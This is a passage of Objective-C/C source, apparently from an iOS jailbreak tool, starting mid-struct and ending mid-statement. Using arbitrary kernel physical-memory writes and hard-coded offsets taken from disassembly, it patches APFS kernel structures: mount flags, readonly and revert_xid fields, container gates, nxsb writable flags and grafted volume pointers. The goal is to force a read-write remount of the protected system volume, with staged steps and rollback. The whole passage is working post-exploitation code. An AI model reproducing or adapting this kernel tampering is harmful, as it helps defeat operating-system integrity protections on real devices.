    uint64_t mount_fsprivate_orig;
    bool link_fix_applied;
    bool container_link_fix_applied;
    bool mount_fsprivate_swap_applied;
    /* IDA rollback: step4 container+0x13C @ 0xa2733c; step6 nxsb+0x4F4 @ 0x98797c;
     * step7 vol_sb+0x30 @ 0xa273a8; nxbuf graft container+0xC8 @ 0x986ed4/0x987978. */
    uint64_t container;
    uint32_t container_mu_gate_orig;
    bool mu_gate_cleared;
    uint64_t container_c8_orig;
    bool container_c8_grafted;
    uint64_t vol_sb_ptr;
    uint64_t vol_sb_q48_orig;
    bool vol_sb_q48_cleared;
    uint64_t nx_buf_ptr;
    uint32_t nxsb_writable_orig;
    bool nxsb_writable_set;
    bool valid;
} dt_build63_remount_snap_t;

/// Re-read outer+0xC0 and recompute mount_ready after build64 link-fix.
static void dt_build64_graph_refresh_mount_ready(dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        g->vol_sb_outer = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_VOL_SB,
            "build64 graph outer+0xC0 post-fix", log);
    dt_build68_compute_mount_ready(g, log);
}

/// IDA apfs_mount_update @ 0xa273a8: vol_sb+48 checked at mount; step7 clears before case5.
static uint64_t dt_build66_pick_link_vol_sb(const dt_apfs_graph_t *g)
{
    if (g && dt_build68_vol_sb_ptr_valid(g->vol_sb_child))
        return g->vol_sb_child;
    if (g && dt_build68_vol_sb_ptr_valid(g->vol_sb_graft))
        return g->vol_sb_graft;
    return 0;
}

static int dt_build66_probe_link_vol_sb_q48(const dt_apfs_graph_t *g, uint64_t vol_sb,
    const char *src, uint64_t *out_q48, void (^log)(NSString *line))
{
    if (!g->os_update || !dt_build68_vol_sb_ptr_valid(vol_sb)) {
        DTPhysLog(log,
            @"[*] build69 os.update graft skip — link vol_sb=0x%llx(%s) invalid",
            vol_sb, src ? src : "?");
        [[DTRunLogger shared] logStage:@"build69 os.update link vol_sb invalid"];
        return -2;
    }

    uint64_t q48 = dt_build38_read_u64_dual(vol_sb + DT_BAKED_APFS_VOL_QWORD48,
        "build68 link vol_sb+0x30", log);
    if (out_q48)
        *out_q48 = q48;

    if (dt_build43_vol_q48_ida_allowed(q48)) {
        DTPhysLog(log,
            @"[*] build69 os.update link vol_sb q48=0x%llx src=%s (IDA @ 0xa273a8)", q48, src);
        [[DTRunLogger shared] logStage:@"build69 os.update link vol_sb q48 OK"];
    } else {
        DTPhysLog(log,
            @"[*] build69 os.update link vol_sb q48=0x%llx src=%s not ida_ok — proceed (step7 clears)",
            q48, src);
        [[DTRunLogger shared] logStage:@"build69 os.update link vol_sb q48 step7 will clear"];
    }
    return 0;
}

static int dt_build64_probe_child_vol_sb_q48(const dt_apfs_graph_t *g, uint64_t *out_q48,
    void (^log)(NSString *line))
{
    if (!g->os_update) {
        DTPhysLog(log, @"[*] build66 os.update graft skip — not os.update root");
        return -1;
    }

    uint64_t vol_sb = dt_build66_pick_link_vol_sb(g);
    const char *src = dt_build68_vol_sb_ptr_valid(g->vol_sb_child) ? g->vol_sb_child_src : g->vol_sb_graft_src;

    if (!vol_sb) {
        if (!dt_build68_vol_sb_ptr_valid(g->vol_sb_graft)) {
            DTPhysLog(log, @"[*] build69 os.update graft skip — no child+0xC0 or vollist vol_sb");
            [[DTRunLogger shared] logStage:@"build69 os.update no vol_sb graft source"];
            return -1;
        }
        vol_sb = g->vol_sb_graft;
        src = g->vol_sb_graft_src;
    }

    return dt_build66_probe_link_vol_sb_q48(g, vol_sb, src, out_q48, log);
}

/// Write child heap vol_sb pointer into outer+0xC0 so case-5 / step7 see the same vol_sb IDA checks.
static int dt_build64_osupdate_link_fix_outer_vol_sb(dt_apfs_graph_t *g, uint64_t *out_prev_vol_sb,
    void (^log)(NSString *line))
{
    uint64_t prev = g->vol_sb_outer;
    if (out_prev_vol_sb)
        *out_prev_vol_sb = prev;

    uint64_t link_vol_sb = dt_build66_pick_link_vol_sb(g);
    const char *link_src = dt_build68_vol_sb_ptr_valid(g->vol_sb_child) ? g->vol_sb_child_src : g->vol_sb_graft_src;

    DTPhysLog(log,
        @"[*] build69 os.update link-fix outer+0xC0 0x%llx → vol_sb 0x%llx(%s) src=%s (IDA case5 @ 0x9da970)",
        prev, link_vol_sb, dt_build38_kptr_class(link_vol_sb), link_src);
    [[DTRunLogger shared] logStage:@"build69 os.update link-fix try"];

    int patch_err = dt_phys_write64_va(g->mnt_outer + DT_BAKED_APFS_VOL_SB, link_vol_sb,
        "build69 outer+0xC0 link-fix", log);
    if (patch_err != 0)
        return patch_err;

    dt_build64_graph_refresh_mount_ready(g, log);
    dt_build62_log_graph(g, "post-link-fix", log);

    if (!g->mount_ready) {
        DTPhysLog(log,
            @"[!] build69 os.update link-fix applied but mount_ready still 0 (container=0x%llx outer+0xC0=0x%llx)",
            g->container, g->vol_sb_outer);
        [[DTRunLogger shared] logStage:@"build69 os.update link-fix mount_ready still 0"];
        (void)dt_phys_write64_va(g->mnt_outer + DT_BAKED_APFS_VOL_SB, prev,
            "build69 outer+0xC0 link-fix revert", log);
        return -4;
    }

    [[DTRunLogger shared] logStage:@"build69 os.update outer+0xC0 link-fix applied"];
    return 0;
}

/// IDA apfs_mount_update @ 0xa27338: LDR X9,[apfs,#0xD0] before container+0x13C mu_gate check.
static bool dt_build69_outer_container_needs_link_fix(const dt_apfs_graph_t *g, uint64_t *out_outer_d0)
{
    if (!g || !g->os_update || !dt_build36_kern_kptr_valid(g->container, 0))
        return false;
    if (!dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        return false;

    uint64_t outer_d0 = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_CONTAINER,
        "build76 outer+0xD0 check", NULL);
    if (out_outer_d0)
        *out_outer_d0 = outer_d0;

    if (outer_d0 == g->container)
        return false;
    return !dt_build43_kptr_is_heap(outer_d0);
}

static int dt_build69_osupdate_link_fix_outer_container(dt_apfs_graph_t *g, uint64_t *out_prev_container,
    void (^log)(NSString *line))
{
    uint64_t prev = 0;
    if (out_prev_container)
        *out_prev_container = 0;

    if (!dt_build69_outer_container_needs_link_fix(g, &prev))
        return 0;

    DTPhysLog(log,
        @"[*] build69 os.update link-fix outer+0xD0 0x%llx → container 0x%llx(%s) (IDA @ 0xa27338)",
        prev, g->container, g->container_src);
    [[DTRunLogger shared] logStage:@"build69 os.update outer+0xD0 link-fix try"];

    int patch_err = dt_phys_write64_va(g->mnt_outer + DT_BAKED_APFS_CONTAINER, g->container,
        "build69 outer+0xD0 link-fix", log);
    if (patch_err != 0)
        return patch_err;

    if (out_prev_container)
        *out_prev_container = prev;
    [[DTRunLogger shared] logStage:@"build69 os.update outer+0xD0 link-fix applied"];
    return 0;
}

static void dt_build70_log_graph_incomplete(const dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    bool container_ok = dt_build36_kern_kptr_valid(g->container, 0);
    bool vol_outer_ok = dt_build68_vol_sb_ptr_valid(g->vol_sb_outer);

    if (!container_ok && !vol_outer_ok) {
        DTPhysLog(log,
            @"[!] build76 graph incomplete — hollow root fsprivate (class=%s +0xC0=0 +0xD0=0); "
            "neighbor_hits=%u adjacent_hits=%u best_slot=%+d orphan_hypothesis=%s. "
            "Reboot — handle_mount @ 0x9e08c4 did not replace hollow shell @ 0x9db020.",
            g->fsprivate_class, g->neighbor_hits, g->neighbor_adjacent_hits, g->neighbor_best_slot,
            g->neighbor_adjacent_hits > 0 ? "likely_obj_get_adjacent" : "no_adjacent_pair");
    } else if (!container_ok) {
        DTPhysLog(log,
            @"[!] build76 graph incomplete — need container (IDA @ 0xa27338); "
            "outer+0xC0=0x%llx(%s) ok neighbor_hits=%u",
            g->vol_sb_outer, dt_build38_kptr_class(g->vol_sb_outer), g->neighbor_hits);
    } else {
        DTPhysLog(log,
            @"[!] build76 graph incomplete — need valid outer+0xC0 (IDA @ 0xa2739c); "
            "container=0x%llx(%s) graft=0x%llx(%s) neighbor_hits=%u",
            g->container, dt_build38_kptr_class(g->container),
            g->vol_sb_graft, g->vol_sb_graft_src, g->neighbor_hits);
    }
    [[DTRunLogger shared] logStage:@"build76 graph incomplete"];
}

static void dt_build64_log_nx_layer_note(const dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!dt_build43_kptr_is_heap(g->container))
        return;

    uint64_t nx_buf = dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF,
        "build64 container+0xC8", log);
    if (!dt_build43_kptr_is_heap(nx_buf)) {
        DTPhysLog(log,
            @"[*] build66 note: container+0xC8=0x%llx(%s) — step6 nx may skip (IDA nx_rw_update LDR @ 0x987904)",
            nx_buf, dt_build38_kptr_class(nx_buf));
        [[DTRunLogger shared] logStage:@"build66 nx layer may skip container+0xC8 invalid"];
    }
}

/// IDA container_load @ 0x986ed4 copies parent container+0xC8 into clone; os.update hollow skips that.
static int dt_build78_try_graft_donor_nxbuf(dt_apfs_graph_t *g, uint64_t donor_container,
    const char *donor_src, void (^log)(NSString *line))
{
    if (!g || !donor_src || !dt_build43_kptr_is_heap(donor_container))
        return 0;
    if (donor_container == g->container)
        return 0;

    uint64_t n_c8 = dt_build38_read_u64_dual(donor_container + DT_BAKED_CONTAINER_NX_SB_BUF,
        "build78 donor nxbuf", log);
    if (!dt_build43_kptr_is_heap(n_c8))
        return 0;

    uint64_t ours = dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF,
        "build78 container+0xC8 pre-graft", log);
    DTPhysLog(log,
        @"[*] build78 graft container+0xC8 0x%llx → 0x%llx from %s (IDA container_load @ 0x986ed4)",
        ours, n_c8, donor_src);
    [[DTRunLogger shared] logStage:@"build78 nxbuf graft donor"];
    return dt_phys_write64_va(g->container + DT_BAKED_CONTAINER_NX_SB_BUF, n_c8,
        "build78 container+0xC8 donor graft", log);
}

/// Graft container+0xC8 (nxbuf) from wired donors when os.update snapshot container never cloned (IDA @ 0x986ed4).
static int dt_build78_try_graft_nxbuf(dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!g || !g->os_update || !dt_build43_kptr_is_heap(g->container))
        return 0;

    uint64_t ours = dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF,
        "build78 container+0xC8 pre-graft", log);
    if (dt_build43_kptr_is_heap(ours))
        return 0;

    if (dt_build36_kern_kptr_valid(g->snap_child, 0)) {
        uint64_t child_container = dt_build38_read_u64_dual(g->snap_child + DT_BAKED_APFS_CONTAINER,
            "build78 child+0xD0 nx donor", log);
        int r = dt_build78_try_graft_donor_nxbuf(g, child_container, "child+0xD0 container", log);
        if (r != 0)
            return r;
        if (dt_build43_kptr_is_heap(dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF,
                "build78 post child nxbuf", log)))
            return 0;
    }

    dt_build76_neighbor_t neighbors[DT_BUILD76_MAX_NEIGHBOR_HITS] = {0};
    unsigned count = dt_build76_neighbor_pair_scan(g->mnt_outer, neighbors,
        DT_BUILD76_MAX_NEIGHBOR_HITS, log);
    for (unsigned i = 0; i < count; i++) {
        char src[48];
        snprintf(src, sizeof(src), "neighbor[%+d]+0xD0", neighbors[i].slot);
        int r = dt_build78_try_graft_donor_nxbuf(g, neighbors[i].container, src, log);
        if (r != 0)
            return r;
        if (dt_build43_kptr_is_heap(dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF,
                "build78 post neighbor nxbuf", log)))
            return 0;
    }

    DTPhysLog(log,
        @"[*] build78 nxbuf graft none — os.update requires heap container+0xC8 "
        "(IDA container_load @ 0x986ed4; nx_rw LDR @ 0x987978)");
    [[DTRunLogger shared] logStage:@"build78 nxbuf graft none"];
    if (!g->os_update)
        return 0;

    uint64_t final_c8 = dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF,
        "build77 post-graft C8", log);
    if (dt_build43_kptr_is_heap(final_c8))
        return 0;

    DTPhysLog(log,
        @"[!] build77 os.update nxbuf graft exhausted — container+0xC8=0x%llx(%s) "
        "(IDA nx_rw_update LDR @ 0x987978)",
        final_c8, dt_build38_kptr_class(final_c8));
    [[DTRunLogger shared] logStage:@"build77 os.update C8 graft exhausted"];
    return DT_BUILD47_ERR_GRAPH_INCOMPLETE;
}

/// Post-step8 os.update health log — C8 gate enforced separately by dt_build77_remount_graph_nx_complete.
static void dt_build78_log_osupdate_post_step8_health(const dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!g || !g->os_update)
        return;

    if (!dt_build43_kptr_is_heap(g->vol_sb_outer)) {
        DTPhysLog(log,
            @"[*] build78 post-step8 note — outer+0xC0=0x%llx(%s) (IDA apfs_mount_update vol_sb @ 0xa2739c)",
            g->vol_sb_outer, dt_build38_kptr_class(g->vol_sb_outer));
        [[DTRunLogger shared] logStage:@"build78 post-step8 vol_sb note"];
    }

    if (!dt_build43_kptr_is_heap(g->container)) {
        DTPhysLog(log, @"[*] build78 post-step8 note — container not heap");
        [[DTRunLogger shared] logStage:@"build78 post-step8 container note"];
        return;
    }

    uint64_t c8 = dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF,
        "build78 post-step8 C8", log);
    if (dt_build43_kptr_is_heap(c8)) {
        DTPhysLog(log,
            @"[*] build78 post-step8 container+0xC8=0x%llx(%s) nx layer OK (IDA @ 0x987978)",
            c8, dt_build38_kptr_class(c8));
        [[DTRunLogger shared] logStage:@"build78 post-step8 C8 OK"];
    } else {
        DTPhysLog(log,
            @"[*] build78 post-step8 note — container+0xC8=0x%llx(%s)",
            c8, dt_build38_kptr_class(c8));
        [[DTRunLogger shared] logStage:@"build78 post-step8 C8 note"];
    }
}

/// os.update only: probe child q48, link-fix outer+0xC0, refresh mount_ready. No step1 until ready.
static int dt_build64_try_osupdate_graft(dt_apfs_graph_t *g, uint64_t *out_prev_vol_sb,
    bool *out_link_fix, uint64_t *out_prev_container, bool *out_container_link_fix,
    void (^log)(NSString *line))
{
    *out_link_fix = false;
    if (out_container_link_fix)
        *out_container_link_fix = false;
    if (out_prev_vol_sb)
        *out_prev_vol_sb = 0;
    if (out_prev_container)
        *out_prev_container = 0;

    if (!g->os_update)
        return 0;

    if (g->mount_ready && !dt_build77_osupdate_vol_sb_link_fix_needed(g))
        return 0;

    if (dt_build77_osupdate_vol_sb_link_fix_needed(g)) {
        DTPhysLog(log,
            @"[*] build77 os.update link-fix forced — outer+0xC0=0x%llx(%s) graft=0x%llx(%s)",
            g->vol_sb_outer, dt_build38_kptr_class(g->vol_sb_outer),
            g->vol_sb_graft, g->vol_sb_graft_src);
        [[DTRunLogger shared] logStage:@"build77 os.update static C0 link-fix run"];
    }

    dt_build64_log_nx_layer_note(g, log);

    if (!dt_build36_kern_kptr_valid(g->container, 0)) {
        DTPhysLog(log,
            @"[!] build76 os.update graft skip — container=0x%llx(%s) src=%s mode=%s",
            g->container, dt_build38_kptr_class(g->container), g->container_src, g->failure_mode);
        [[DTRunLogger shared] logStage:@"build76 os.update no container"];
        return -1;
    }

    uint64_t prev_d0 = 0;
    if (dt_build69_outer_container_needs_link_fix(g, &prev_d0)) {
        int d0r = dt_build69_osupdate_link_fix_outer_container(g, &prev_d0, log);
        if (d0r != 0)
            return d0r;
        if (out_prev_container)
            *out_prev_container = prev_d0;
        if (out_container_link_fix)
            *out_container_link_fix = true;
    }

    int probe_r = dt_build64_probe_child_vol_sb_q48(g, NULL, log);
    if (probe_r != 0)
        return probe_r;

    uint64_t prev = 0;
    int fix_r = dt_build64_osupdate_link_fix_outer_vol_sb(g, &prev, log);
    if (fix_r != 0)
        return fix_r;

    if (out_prev_vol_sb)
        *out_prev_vol_sb = prev;
    *out_link_fix = true;
    return 0;
}

static bool g_dt_rootful_remount_ok = false;

bool dt_build_rootful_remount_ok(void)
{
    return g_dt_rootful_remount_ok;
}

static void dt_build80_restore_pre_snapshot_edits(uint64_t mount_mp, uint64_t mount_apfs,
    uint64_t vol_sb_outer_orig, bool link_fix_applied,
    uint64_t outer_container_orig, bool container_link_fix_applied,
    uint64_t mount_fsprivate_orig, bool mount_fsprivate_swap_applied,
    void (^log)(NSString *line))
{
    if (link_fix_applied) {
        (void)dt_phys_write64_va(mount_apfs + DT_BAKED_APFS_VOL_SB, vol_sb_outer_orig,
            "build80 pre-snapshot restore outer+0xC0", log);
        [[DTRunLogger shared] logStage:@"build80 pre-snapshot restore outer+0xC0"];
    }
    if (container_link_fix_applied) {
        (void)dt_phys_write64_va(mount_apfs + DT_BAKED_APFS_CONTAINER, outer_container_orig,
            "build80 pre-snapshot restore outer+0xD0", log);
        [[DTRunLogger shared] logStage:@"build80 pre-snapshot restore outer+0xD0"];
    }
    if (mount_fsprivate_swap_applied) {
        (void)dt_phys_write64_va(mount_mp + DT_BAKED_MOUNT_FSPRIVATE, mount_fsprivate_orig,
            "build80 pre-snapshot restore mount+0x8F8", log);
        [[DTRunLogger shared] logStage:@"build80 pre-snapshot restore mount+0x8F8"];
    }
}

static void dt_build63_remount_snap_save(dt_build63_remount_snap_t *snap, uint64_t mount_mp,
    uint64_t mount_apfs, const dt_apfs_graph_t *graph,
    uint64_t vol_sb_outer_orig, bool link_fix_applied,
    uint64_t outer_container_orig, bool container_link_fix_applied,
    uint64_t mount_fsprivate_orig, bool mount_fsprivate_swap_applied,
    void (^log)(NSString *line))
{
    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    memset(snap, 0, sizeof(*snap));
    snap->mount_mp = mount_mp;
    snap->mount_apfs = mount_apfs;
    snap->mnt_flag = dt_build38_read_u32_dual(mount_mp + o->off_mount_mnt_flag, "snap mp+0x70", log);
    snap->mnt_kern = dt_build38_read_u32_dual(mount_mp + o->off_mount_mnt_flag + 4, "snap mp+0x74", log);
    snap->apfs_readonly = dt_build38_read_u32_dual(mount_apfs + DT_BAKED_APFS_READONLY, "snap outer+0x2B4", log);
    snap->revert_xid = dt_build38_read_u64_dual(mount_apfs + DT_BAKED_APFS_REVERT_XID, "snap outer+0xF8", log);
    snap->vol_sb_outer_orig = vol_sb_outer_orig;
    snap->outer_container_orig = outer_container_orig;
    snap->mount_fsprivate_orig = mount_fsprivate_orig;
    snap->link_fix_applied = link_fix_applied;
    snap->container_link_fix_applied = container_link_fix_applied;
    snap->mount_fsprivate_swap_applied = mount_fsprivate_swap_applied;

    if (graph && dt_build43_kptr_is_heap(graph->container)) {
        snap->container = graph->container;
        snap->container_mu_gate_orig = dt_build38_read_u32_dual(
            graph->container + DT_BAKED_CONTAINER_MU_GATE, "snap container+0x13C", log);
        snap->container_c8_orig = dt_build38_read_u64_dual(
            graph->container + DT_BAKED_CONTAINER_NX_SB_BUF, "snap container+0xC8", log);
        if (dt_build43_kptr_is_heap(snap->container_c8_orig)) {
            snap->nx_buf_ptr = snap->container_c8_orig;
            snap->nxsb_writable_orig = dt_build38_read_u32_dual(
                snap->nx_buf_ptr + DT_BAKED_NXSB_WRITABLE, "snap nxsb+0x4F4", log);
        }
    }

    uint64_t vol_sb = dt_build38_read_u64_dual(mount_apfs + DT_BAKED_APFS_VOL_SB, "snap vol_sb+0xC0", log);
    if (dt_build43_kptr_is_heap(vol_sb)) {
        snap->vol_sb_ptr = vol_sb;
        snap->vol_sb_q48_orig = dt_build38_read_u64_dual(
            vol_sb + DT_BAKED_APFS_VOL_QWORD48, "snap vol_sb+0x30", log);
    }

    snap->valid = true;
}

static void dt_build63_remount_snap_restore(const dt_build63_remount_snap_t *snap, void (^log)(NSString *line))
{
    if (!snap || !snap->valid)
        return;

    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    [[DTRunLogger shared] logStage:@"build63 remount rollback begin"];
    (void)dt_phys_write32_va(snap->mount_mp + o->off_mount_mnt_flag, snap->mnt_flag,
        "rollback mp+0x70 mnt_flag", log);
    (void)dt_phys_write32_va(snap->mount_mp + o->off_mount_mnt_flag + 4, snap->mnt_kern,
        "rollback mp+0x74 mnt_kern", log);
    (void)dt_phys_write32_va(snap->mount_apfs + DT_BAKED_APFS_READONLY, snap->apfs_readonly,
        "rollback outer+0x2B4 apfs_readonly", log);
    (void)dt_phys_write64_va(snap->mount_apfs + DT_BAKED_APFS_REVERT_XID, snap->revert_xid,
        "rollback outer+0xF8 revert_xid", log);
    if (snap->link_fix_applied) {
        (void)dt_phys_write64_va(snap->mount_apfs + DT_BAKED_APFS_VOL_SB, snap->vol_sb_outer_orig,
            "rollback outer+0xC0 link-fix", log);
    }
    if (snap->container_link_fix_applied) {
        (void)dt_phys_write64_va(snap->mount_apfs + DT_BAKED_APFS_CONTAINER, snap->outer_container_orig,
            "rollback outer+0xD0 link-fix", log);
    }
    if (snap->mount_fsprivate_swap_applied) {
        (void)dt_phys_write64_va(snap->mount_mp + DT_BAKED_MOUNT_FSPRIVATE, snap->mount_fsprivate_orig,
            "rollback mount+0x8F8 fsprivate swap", log);
    }
    if (snap->mu_gate_cleared && snap->container) {
        (void)dt_phys_write32_va(snap->container + DT_BAKED_CONTAINER_MU_GATE,
            snap->container_mu_gate_orig, "rollback container+0x13C mu_gate", log);
    }
    if (snap->container_c8_grafted && snap->container) {
        (void)dt_phys_write64_va(snap->container + DT_BAKED_CONTAINER_NX_SB_BUF,
            snap->container_c8_orig, "rollback container+0xC8 nxbuf graft", log);
    }
    if (snap->nxsb_writable_set && snap->nx_buf_ptr) {
        (void)dt_phys_write32_va(snap->nx_buf_ptr + DT_BAKED_NXSB_WRITABLE,
            snap->nxsb_writable_orig, "rollback nxsb+0x4F4", log);
    }
    if (snap->vol_sb_q48_cleared && snap->vol_sb_ptr) {
        (void)dt_phys_write64_va(snap->vol_sb_ptr + DT_BAKED_APFS_VOL_QWORD48,
            snap->vol_sb_q48_orig, "rollback vol_sb+0x30 q48", log);
    }
    [[DTRunLogger shared] logStage:@"build63 remount rollback done"];
    DTPhysLog(log,
        @"[*] build63 restored pre-remount fields mnt_flag=0x%x mnt_kern=0x%x apfs_ro=%u revert_xid=0x%llx "
        "fsprivate_swap=%d mu_gate=%d c8_graft=%d nxsb_4F4=%d q48=%d",
        snap->mnt_flag, snap->mnt_kern, snap->apfs_readonly, snap->revert_xid,
        snap->mount_fsprivate_swap_applied ? 1 : 0,
        snap->mu_gate_cleared ? 1 : 0,
        snap->container_c8_grafted ? 1 : 0,
        snap->nxsb_writable_set ? 1 : 0,
        snap->vol_sb_q48_cleared ? 1 : 0);
}

static int dt_build47_staged_remount(void (^log)(NSString *line))
{
    if (!gPrimitives.physreadbuf || !gPrimitives.vtophys) {
        [[DTRunLogger shared] logStage:@"build47 physread missing"];
        return -1;
    }

    dt_build38_chain_t chain = {0};
    int cr = dt_build38_resolve_chain(&chain, log);
    if (cr != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 chain fail %d", cr]];
        return cr;
    }
    if (!dt_build36_kern_kptr_valid(chain.apfs, 0)) {
        DTPhysLog(log, @"[!] build47 outer apfs=0x%llx invalid", chain.apfs);
        [[DTRunLogger shared] logStage:@"build47 outer apfs invalid"];
        return -5;
    }

    dt_apfs_graph_t graph = {0};
    dt_build62_resolve_graph(&chain, &graph, log);
    dt_build62_log_graph(&graph, "pre-patch", log);

    uint64_t link_fix_prev_vol_sb = 0;
    bool link_fix_applied = false;
    uint64_t link_fix_prev_container = 0;
    bool container_link_fix_applied = false;
    uint64_t fsprivate_swap_prev = 0;
    bool fsprivate_swap_applied = false;
    int swap_r = dt_build80_try_mount_fsprivate_swap(&chain, &graph,
        &fsprivate_swap_prev, &fsprivate_swap_applied, log);
    if (swap_r != 0)
        return swap_r;
    if (fsprivate_swap_applied || graph.mnt_outer != chain.apfs)
        dt_build81_sync_chain_from_graph(&chain, &graph, log);

    dt_build66_discover_and_enrich(&chain, &graph, log);
    dt_build62_log_graph(&graph, "post-discover", log);

    uint64_t mount_apfs = graph.mnt_outer;

    dt_build42_deep_discovery_ex(&chain, graph.container, "pre-patch", log);
    dt_build47_statfs_stage("pre", "/", log);

    if (fsprivate_swap_applied) {
        mount_apfs = graph.mnt_outer;
        dt_build42_deep_discovery_for_apfs(mount_apfs, graph.container,
            "post-mounted-fsprivate-swap", log);
    }

    int graft_r = dt_build64_try_osupdate_graft(&graph, &link_fix_prev_vol_sb, &link_fix_applied,
        &link_fix_prev_container, &container_link_fix_applied, log);
    if (graft_r != 0) {
        dt_build80_restore_pre_snapshot_edits(chain.mount_mp, graph.mnt_outer,
            link_fix_prev_vol_sb, link_fix_applied,
            link_fix_prev_container, container_link_fix_applied,
            fsprivate_swap_prev, fsprivate_swap_applied, log);
        return graft_r;
    }
    if (link_fix_applied) {
        dt_build42_deep_discovery_for_apfs(mount_apfs, graph.container, "post-link-fix", log);
        if (dt_build36_kern_kptr_valid(graph.mnt_outer, 0))
            graph.vol_sb_outer = dt_build38_read_u64_dual(graph.mnt_outer + DT_BAKED_APFS_VOL_SB,
                "build76 outer+0xC0 post-link-fix", log);
        dt_build76_read_outer_shell_fields(&graph, log);
        dt_build76_classify_fsprivate(&graph);
        dt_build68_compute_mount_ready(&graph, log);
        dt_build66_classify_failure(&graph);
        dt_build76_log_test_report(&graph, "post-link-fix", log);
    }

    if (graph.mount_ready && graph.os_update) {
        uint64_t prev_d0 = 0;
        if (dt_build69_outer_container_needs_link_fix(&graph, &prev_d0)) {
            int d0r = dt_build69_osupdate_link_fix_outer_container(&graph, &link_fix_prev_container, log);
            if (d0r != 0) {
                dt_build80_restore_pre_snapshot_edits(chain.mount_mp, graph.mnt_outer,
                    link_fix_prev_vol_sb, link_fix_applied,
                    link_fix_prev_container, container_link_fix_applied,
                    fsprivate_swap_prev, fsprivate_swap_applied, log);
                return d0r;
            }
            container_link_fix_applied = true;
            link_fix_prev_container = prev_d0;
        }
    }

    if (!graph.mount_ready) {
        if (graph.os_update) {
            if (dt_build36_kern_kptr_valid(graph.container, 0) &&
                (dt_build36_kern_kptr_valid(graph.snap_child, 0) ||
                 dt_build68_vol_sb_ptr_valid(graph.vol_sb_graft))) {
                DTPhysLog(log,
                    @"[!] build69 os.update partial graph mode=%s — graft failed; "
                    "outer+0xC0=0x%llx child_vol_sb=0x%llx(%s) graft_vol=0x%llx(%s) child=0x%llx(%s)",
                    graph.failure_mode, graph.vol_sb_outer, graph.vol_sb_child, graph.vol_sb_child_src,
                    graph.vol_sb_graft, graph.vol_sb_graft_src,
                    graph.snap_child, graph.child_src);
                [[DTRunLogger shared] logStage:@"build69 os.update graft failed remount N/A"];
            } else {
                DTPhysLog(log,
                    @"[!] build76 os.update snapshot root mode=%s — neighbor=%u vollist=%u backlink=%u head_raw=0x%llx tail=0x%llx "
                    "container=0x%llx child=0x%llx (IDA @ 0xa27338)",
                    graph.failure_mode, graph.neighbor_hits, graph.vollist_scanned, graph.backlink_hits,
                    graph.container_vol_head_raw, graph.container_vol_tail,
                    graph.container, graph.snap_child);
                [[DTRunLogger shared] logStage:@"build76 os.update hollow graph remount N/A"];
            }
        }
        dt_build70_log_graph_incomplete(&graph, log);
        dt_build76_log_test_report(&graph, "NA", log);
        [[DTRunLogger shared] logStage:@"build62 graph incomplete — abort before step1"];
        dt_build80_restore_pre_snapshot_edits(chain.mount_mp, graph.mnt_outer,
            link_fix_prev_vol_sb, link_fix_applied,
            link_fix_prev_container, container_link_fix_applied,
            fsprivate_swap_prev, fsprivate_swap_applied, log);
        return DT_BUILD47_ERR_GRAPH_INCOMPLETE;
    }

    dt_build76_log_test_report(&graph, "attempt", log);
    dt_build63_remount_snap_t snap = {0};
    bool snap_active = false;
    int ret = 0;

    dt_build63_remount_snap_save(&snap, chain.mount_mp, mount_apfs, &graph, link_fix_prev_vol_sb,
        link_fix_applied, link_fix_prev_container, container_link_fix_applied,
        fsprivate_swap_prev, fsprivate_swap_applied, log);
    snap_active = true;

    int r1 = dt_build47_patch_mount_mp_gates(chain.mount_mp, "step1", log);
    if (r1 != 0) {
        ret = r1;
        goto rollback;
    }
    dt_build47_statfs_stage("post-step1", "/", log);

    int r2 = dt_build40_patch_apfs_readonly(mount_apfs, log);
    if (r2 != 0) {
        ret = r2;
        goto rollback;
    }
    dt_build47_statfs_stage("post-step2", "/", log);

    int r3 = dt_build40_patch_revert_xid(mount_apfs, log);
    if (r3 != 0) {
        ret = r3;
        goto rollback;
    }
    dt_build47_statfs_stage("post-step3", "/", log);

    int r4 = dt_build43_patch_container_mu_gate(graph.container, log);
    if (r4 != 0) {
        ret = r4;
        goto rollback;
    }
    if (snap.container_mu_gate_orig != 0)
        snap.mu_gate_cleared = true;
    dt_build47_statfs_stage("post-step4", "/", log);

    int r5 = dt_build43_patch_container_remap(graph.container, log);
    if (r5 != 0) {
        ret = r5;
        goto rollback;
    }
    dt_build47_statfs_stage("post-step5", "/", log);

    if (graph.os_update) {
        int nxgr = dt_build78_try_graft_nxbuf(&graph, log);
        if (nxgr != 0) {
            ret = nxgr;
            goto rollback;
        }
        uint64_t c8_post_graft = dt_build38_read_u64_dual(
            graph.container + DT_BAKED_CONTAINER_NX_SB_BUF, "build77 post-graft C8", log);
        if (c8_post_graft != snap.container_c8_orig)
            snap.container_c8_grafted = true;
        if (dt_build43_kptr_is_heap(c8_post_graft)) {
            snap.nx_buf_ptr = c8_post_graft;
            snap.nxsb_writable_orig = dt_build38_read_u32_dual(
                c8_post_graft + DT_BAKED_NXSB_WRITABLE, "snap nxsb+0x4F4 post-graft", log);
        }
        if (!dt_build77_remount_graph_nx_complete(&graph, log)) {
            ret = DT_BUILD47_ERR_GRAPH_INCOMPLETE;
            goto rollback;
        }
    }

    int r6 = dt_build43_patch_nxsb_writable(graph.container, log);
    if (r6 != 0) {
        ret = r6;
        goto rollback;
    }
    if (snap.nx_buf_ptr && snap.nxsb_writable_orig == 0)
